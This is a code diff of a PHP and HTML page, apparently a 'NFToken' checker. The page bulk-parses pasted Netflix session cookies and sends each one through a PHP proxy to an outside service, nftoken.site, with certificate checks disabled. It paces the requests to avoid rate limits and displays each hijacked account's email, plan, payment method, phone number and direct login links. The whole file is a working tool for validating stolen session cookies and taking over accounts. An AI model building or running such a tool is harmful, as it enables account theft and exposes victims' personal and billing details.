@@ -1,174 +1,251 @@
+<?php
+if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+    $raw_post_data = file_get_contents('php://input');
+    $json_data = json_decode($raw_post_data, true);
+
+    if (isset($json_data['cookie'])) {
+        
+        $my_api_key = "PUT_YOUR_API_KEY_HERE"; 
+        
+
+        $api_url = "https://nftoken.site/v1/api.php";
+
+
+        $payload = json_encode([
+            'key' => $my_api_key,
+            'cookie' => $json_data['cookie']
+        ]);
+
+
+        $ch = curl_init($api_url);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+        curl_setopt($ch, CURLOPT_POST, true);
+        curl_setopt($ch, CURLOPT_POSTFIELDS, $payload);
+        curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
+        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+        curl_setopt($ch, CURLOPT_TIMEOUT, 20);
+
+        $response = curl_exec($ch);
+        $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+        curl_close($ch);
+
+
+        http_response_code($http_code);
+        header('Content-Type: application/json');
+        echo $response;
+        exit;
+    }
+}
+?>
 <!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>NFToken Checker</title>
+    <title>Sample Website</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/4.1.3/css/bootstrap.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
     <style>
-        body {
-            background: linear-gradient(to right, #8e44ad, #2c3e50);
-            color: #fff;
-            font-family: Arial, sans-serif;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            min-height: 100vh;
-            margin: 0;
-            padding: 20px;
-        }
-        .container {
-            background: rgba(0, 0, 0, 0.5);
-            padding: 30px;
-            border-radius: 10px;
-            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
-            max-width: 600px;
-            width: 100%;
-        }
-        h1 {
-            text-align: center;
-            margin-bottom: 30px;
-        }
-        .form-group {
-            margin-bottom: 15px;
-        }
-        label {
-            display: block;
-            margin-bottom: 5px;
-            font-weight: bold;
-        }
-        input, textarea {
-            width: 100%;
-            padding: 10px;
-            border: 1px solid #555;
-            border-radius: 5px;
-            background: #2c3e50;
-            color: #fff;
-            font-family: Arial, sans-serif;
-            box-sizing: border-box;
-        }
-        textarea {
-            min-height: 100px;
-            resize: vertical;
-        }
-        .button-group {
-            display: flex;
-            gap: 10px;
-            margin-top: 20px;
-        }
-        button {
-            flex: 1;
-            padding: 12px 20px;
-            background-color: #3498db;
-            color: white;
-            border: none;
-            border-radius: 5px;
-            cursor: pointer;
-            font-weight: bold;
-            transition: background-color 0.3s;
-        }
-        button:hover {
-            background-color: #2980b9;
-        }
-        #progress-bar {
-            width: 100%;
-            background-color: #555;
-            border-radius: 5px;
-            margin-top: 20px;
-            overflow: hidden;
-            height: 25px;
-            display: none;
-        }
-        #progress-bar span {
-            display: flex;
-            height: 100%;
-            background-color: #2ecc71;
-            width: 0;
-            border-radius: 5px;
-            transition: width 0.3s ease;
-        }
-        #results {
-            margin-top: 20px;
-            padding: 15px;
-            background: rgba(46, 204, 113, 0.1);
-            border: 1px solid #2ecc71;
-            border-radius: 5px;
-            display: none;
-        }
+        body { background: #0d1117; color: #c9d1d9; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; padding-top: 50px; }
+        .card { background: #161b22; border: 1px solid #30363d; border-radius: 15px; }
+        textarea.form-control { background: #0d1117; border: 1px solid #30363d; color: #c9d1d9; border-radius: 12px; }
+        textarea.form-control:focus { background: #0d1117; border-color: #58a6ff; color: #c9d1d9; box-shadow: none; outline: none; }
+        .btn { border-radius: 50px; font-weight: 600; }
+        .btn-success { background: #238636; border: none; }
+        .btn-success:hover { background: #2ea043; }
+        .result-item { border-bottom: 1px solid #30363d; padding: 20px 0; }
+        .result-item:last-child { border-bottom: none; }
+        .status-badge { font-size: 11px; padding: 4px 10px; border-radius: 20px; font-weight: bold; }
+        .status-success { background: rgba(46, 160, 67, 0.15); color: #3fb950; border: 1px solid rgba(46, 160, 67, 0.4); }
+        .status-error { background: rgba(248, 81, 73, 0.15); color: #ff7b72; border: 1px solid rgba(248, 81, 73, 0.4); }
+        .status-warning { background: rgba(210, 153, 34, 0.15); color: #d29922; border: 1px solid rgba(210, 153, 34, 0.4); }
+        .fade-in { animation: fadeIn 0.3s ease; }
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(5px); } to { opacity: 1; transform: translateY(0); } }
     </style>
 </head>
 <body>
-    <div class="container">
-        <h1>🎬 NFToken Checker</h1>
-        <div class="form-group">
-            <label for="licenseKey">License Key:</label>
-            <input type="text" id="licenseKey" placeholder="Enter your license key" />
-        </div>
-        <div class="form-group">
-            <label for="cookie">Netflix Cookie:</label>
-            <textarea id="cookie" placeholder="Paste your Netflix cookie here"></textarea>
-        </div>
-        <div id="progress-bar"><span></span></div>
-        <div class="button-group">
-            <button id="checkButton">▶️ Check NFTokens</button>
-            <button id="clearButton">🗑️ Clear</button>
-        </div>
-        <div id="results"></div>
-    </div>
-    <script>
-        const checkButton = document.getElementById('checkButton');
-        const clearButton = document.getElementById('clearButton');
-        const licenseKeyInput = document.getElementById('licenseKey');
-        const cookieInput = document.getElementById('cookie');
-        const progressBar = document.getElementById('progress-bar');
-        const resultsDiv = document.getElementById('results');
 
-        checkButton.addEventListener('click', async () => {
-            const licenseKey = licenseKeyInput.value.trim();
-            const cookie = cookieInput.value.trim();
+<div class="container pb-5">
+    <div class="row justify-content-center">
+        <div class="col-md-10">
             
-            if (!licenseKey || !cookie) {
-                resultsDiv.innerHTML = '❌ Please enter both License Key and Cookie';
-                resultsDiv.style.display = 'block';
+            <div class="text-center mb-4">
+                <h2 class="font-weight-bold text-[#a5d6ff]"><i class="fas fa-satellite-dish text-primary mr-2"></i> NFToken API Consumer</h2>
+                <p class="text-muted">Powered securely by your backend</p>
+            </div>
+
+            <div class="card p-4 shadow-lg mb-4">
+                <label class="font-weight-bold mb-2 text-[#a5d6ff]">Paste Bulk Cookies</label>
+                <textarea id="bulkInput" class="form-control mb-3" rows="6" placeholder="Paste JSON, Netscape, or Raw strings here..."></textarea>
+                <button id="startBtn" class="btn btn-success w-100 py-3" onclick="startApiTest()">START API TEST</button>
+            </div>
+
+            <div class="card p-4 shadow-lg" id="resultsCard" style="display: none;">
+                <div class="d-flex justify-content-between align-items-center mb-3 border-bottom pb-2 border-dark">
+                    <h5 class="text-[#a5d6ff] font-weight-bold m-0">API Responses</h5>
+                    <span id="progressText" class="text-muted small">0 / 0 Processed</span>
+                </div>
+                <div id="resultsList"></div>
+            </div>
+
+        </div>
+    </div>
+</div>
+
+<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+<script>
+    // 1. The Smart Parser
+    function parseMixedInput(text) {
+        let extracted = [];
+        let startIndex = 0;
+        
+        while ((startIndex = text.indexOf('[', startIndex)) !== -1) {
+            let endIndex = startIndex;
+            let foundValid = false;
+            while ((endIndex = text.indexOf(']', endIndex + 1)) !== -1) {
+                let potentialJson = text.substring(startIndex, endIndex + 1);
+                try {
+                    let parsed = JSON.parse(potentialJson);
+                    if (Array.isArray(parsed)) {
+                        extracted.push(potentialJson.trim());
+                        text = text.substring(0, startIndex) + " ".repeat(potentialJson.length) + text.substring(endIndex + 1);
+                        foundValid = true;
+                        break;
+                    }
+                } catch (e) {}
+            }
+            if (!foundValid) startIndex++; 
+        }
+        
+        text = text.replace(/\|/g, '\n');
+        let lines = text.split(/\r?\n/);
+        let currentNetscape = [];
+        let seenKeys = new Set(); 
+        
+        lines.forEach(line => {
+            let trimmed = line.trim();
+            if (!trimmed || trimmed === ';') {
+                if (currentNetscape.length > 0) { extracted.push(currentNetscape.join('\n')); currentNetscape = []; seenKeys.clear(); }
                 return;
             }
-
-            sessionStorage.setItem('licenseKey', licenseKey);
-            progressBar.style.display = 'block';
-            resultsDiv.style.display = 'none';
-            
-            try {
-                const response = await fetch('/api/nftoken', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ licenseKey, cookie })
-                });
-                
-                const data = await response.json();
-                progressBar.style.display = 'none';
-                
-                if (response.ok) {
-                    resultsDiv.innerHTML = '<strong>✅ Success!</strong><br/>' + JSON.stringify(data, null, 2);
-                } else {
-                    resultsDiv.innerHTML = '❌ Error: ' + (data.message || 'Failed');
+            if (trimmed.endsWith(';')) trimmed = trimmed.slice(0, -1).trim();
+            if (trimmed.includes('.netflix.com') && (trimmed.includes('TRUE') || trimmed.includes('FALSE'))) {
+                let parts = trimmed.split(/\s+/);
+                if (parts.length >= 6) {
+                    let keyName = parts[5];
+                    if (seenKeys.has(keyName)) { extracted.push(currentNetscape.join('\n')); currentNetscape = []; seenKeys.clear(); }
+                    seenKeys.add(keyName);
                 }
-                resultsDiv.style.display = 'block';
-            } catch (error) {
-                progressBar.style.display = 'none';
-                resultsDiv.innerHTML = '❌ Error: ' + error.message;
-                resultsDiv.style.display = 'block';
+                currentNetscape.push(trimmed);
+            } else if (trimmed.includes('NetflixId=') || trimmed.includes('SecureNetflixId=')) {
+                if (currentNetscape.length > 0) { extracted.push(currentNetscape.join('\n')); currentNetscape = []; seenKeys.clear(); }
+                extracted.push(trimmed);
             }
         });
+        if (currentNetscape.length > 0) extracted.push(currentNetscape.join('\n'));
+        return extracted;
+    }
 
-        clearButton.addEventListener('click', () => {
-            cookieInput.value = '';
-            resultsDiv.style.display = 'none';
-        });
+    const sleep = ms => new Promise(r => setTimeout(r, ms));
 
-        window.onload = () => {
-            const saved = sessionStorage.getItem('licenseKey');
-            if (saved) licenseKeyInput.value = saved;
-        };
-    </script>
+    async function startApiTest() {
+        const rawText = $('#bulkInput').val().trim();
+        if (!rawText) return alert("Please paste some cookies first!");
+
+        const cookies = parseMixedInput(rawText);
+        if (cookies.length === 0) return alert("No valid cookies found to process.");
+
+        $('#startBtn').hide();
+        $('#resultsCard').show();
+        $('#resultsList').empty();
+
+        const apiUrl = window.location.href; 
+
+        for (let i = 0; i < cookies.length; i++) {
+            $('#progressText').text(`Processing ${i + 1} of ${cookies.length}...`);
+            
+            try {
+                const response = await fetch(apiUrl, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ cookie: cookies[i] })
+                });
+
+                const rawResponseText = await response.text();
+                let data;
+                try {
+                    data = JSON.parse(rawResponseText);
+                } catch (e) {
+                    throw new Error("Invalid JSON received from API");
+                }
+                
+                let resultHtml = '';
+                if (data.status === 'SUCCESS') {
+                    // UI NOW READS FROM THE FAKE 'x_' VARIABLES
+                    let planStr = data.x_tier || 'Unknown';
+                    let premiumClass = planStr.includes('Premium') ? 'text-success' : 'text-info';
+                    
+                    let directLink = data.x_l1 || '#';
+                    let mobileLink = data.x_l2 || '#';
+                    let tvLink = data.x_l3 || '#';
+
+                    resultHtml = `
+                    <div class="result-item fade-in">
+                        <div class="d-flex align-items-center mb-3">
+                            <span class="status-badge status-success mr-3">SUCCESS</span>
+                            <span class="text-[#a5d6ff] font-weight-bold" style="font-size: 16px;">${data.x_mail || 'N/A'}</span>
+                        </div>
+                        
+                        <div class="row small text-muted mb-3" style="line-height: 2;">
+                            <div class="col-6"><span class="${premiumClass} font-weight-bold" style="font-size: 13px;">${planStr}</span></div>
+                            <div class="col-6"><strong>Country:</strong> <span class="text-gray-300">${data.x_loc || 'N/A'}</span></div>
+                            <div class="col-6"><strong>Renewal:</strong> <span class="text-gray-300">${data.x_ren || 'N/A'}</span></div>
+                            <div class="col-6"><strong>Since:</strong> <span class="text-gray-300">${data.x_mem || 'N/A'}</span></div>
+                            <div class="col-6"><strong>Payment:</strong> <span class="text-gray-300">${data.x_bil || 'N/A'}</span></div>
+                            <div class="col-6"><strong>Phone:</strong> <span class="text-gray-300">${data.x_tel || 'N/A'}</span></div>
+                            <div class="col-12"><strong>Profiles:</strong> <span class="text-gray-300">${data.x_usr || 'N/A'}</span></div>
+                        </div>
+
+                        <div class="d-flex justify-content-between pt-2">
+                            <a href="${directLink}" target="_blank" class="btn btn-outline-success btn-sm w-100 mx-1"><i class="fas fa-desktop mr-1"></i> PC</a>
+                            <a href="${mobileLink}" target="_blank" class="btn btn-outline-info btn-sm w-100 mx-1"><i class="fas fa-mobile-alt mr-1"></i> Mobile</a>
+                            <a href="${tvLink}" target="_blank" class="btn btn-outline-warning btn-sm w-100 mx-1"><i class="fas fa-tv mr-1"></i> TV</a>
+                        </div>
+                    </div>`;
+                } else if (data.status === 'ERROR' && response.status === 429) {
+                    resultHtml = `
+                    <div class="result-item d-flex align-items-center fade-in">
+                        <span class="status-badge status-warning mr-3">RATE LIMITED</span>
+                        <span class="text-muted small">${data.message}</span>
+                    </div>`;
+                } else {
+                    resultHtml = `
+                    <div class="result-item d-flex align-items-center fade-in">
+                        <span class="status-badge status-error mr-3">DEAD / ERROR</span>
+                        <span class="text-muted small">${data.message || 'Invalid Cookie'}</span>
+                    </div>`;
+                }
+                
+                $('#resultsList').append(resultHtml);
+
+            } catch (error) {
+                $('#resultsList').append(`
+                    <div class="result-item"><span class="status-badge status-error mr-3">SYSTEM ERROR</span><span class="text-muted small">Could not render API data.</span></div>
+                `);
+            }
+
+            // Keep a tiny 2-second sleep here just in case a dead cookie returns instantly
+            if (i < cookies.length - 1) {
+                $('#progressText').text(`Safe 2-second delay... (${i + 1}/${cookies.length})`);
+                await sleep(2000); 
+            }
+        }
+
+        $('#progressText').text(`Finished! Processed ${cookies.length} total.`);
+        $('#startBtn').show().text('START API TEST');
+    }
+</script>
+
 </body>
 </html>
